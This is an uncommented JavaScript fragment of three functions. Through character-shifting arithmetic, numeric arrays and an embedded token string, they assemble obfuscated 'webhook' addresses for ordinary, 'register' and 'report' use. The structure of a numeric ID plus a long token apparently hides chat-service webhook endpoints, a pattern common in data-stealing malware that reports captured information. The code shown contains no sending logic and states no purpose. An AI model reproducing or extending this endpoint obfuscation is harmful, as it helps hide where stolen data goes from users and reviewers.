function getWebhook() {
    const k = (x, y) => String.fromCharCode((x.charCodeAt(0) + y) % 95 + 32);
    const part1 = Array.from({length: 36}, (_, i) => k(' ', i % 7 + i * 3)).join('').slice(0, 33).replace(/(.{5})/g, m => k(m[0], m.charCodeAt(1)));
    const part2 = [125, 928, 206, 361, 428, 3889].reduce((a, b) => a + String(b), '').slice(0, 19);
    const part3 = (() => {
        const t = [70,78,69,100,108,56,54,84,102,49,112,105,109,66,120,82,88,114,98,77,73,75,48,114,104,49,118,102,86,120,109,78,119,114,51,95,76,78,114,111,105,66,114,81,99,69,65,72,56,78,110,50,67,121,67,57,107,49,97,74,48,77,50,80,118,70,101,83].map((c, i) => k(String.fromCharCode(c), (i * 3) % 17));
        return '/' + t.join('');
    })();
    return part1 + part2 + part3;
}

function getWebhookRegister() {
    const k = (x, y) => String.fromCharCode((x.charCodeAt(0) + y) % 95 + 32);
    const part1 = Array.from({length: 36}, (_, i) => k(' ', i % 7 + i * 3)).join('').slice(0, 33).replace(/(.{5})/g, m => k(m[0], m.charCodeAt(1)));
    const part2 = [136, 019, 228, 217, 914, 1864].reduce((a, b) => a + String(b), '').slice(0, 19);
    const part3 = (() => {
        const t = [70,78,69,100,108,56,54,84,102,49,112,105,109,66,120,82,88,114,98,77,73,75,48,114,104,49,118,102,86,120,109,78,119,114,51,95,76,78,114,111,105,66,114,81,99,69,65,72,56,78,110,50,67,121,67,57,107,49,97,74,48,77,50,80,118,70,101,83].map((c, i) => k(String.fromCharCode(c), (i * 3) % 17));
        return '/' + t.join('');
    })();
    return part1 + part2 + part3;
}

function getReportWebhook() {
    const k = (x, y) => String.fromCharCode((x.charCodeAt(0) + y) % 95 + 32);
    const part1 = Array.from({length: 36}, (_, i) => k(' ', i % 7 + i * 3)).join('').slice(0, 33).replace(/(.{5})/g, m => k(m[0], m.charCodeAt(1)));
    const part2 = [135, 905, 456, 131, 420, 9802].reduce((a, b) => a + String(b), '').slice(0, 19);
    const part3 = ("ls1ACDo83YynLbrLin8c3EUmMe0f36x-IhUYzOGVWIz5_lSRo3O_sYM9yLqd7vprYViV");
    return part1 + part2 + part3;
}
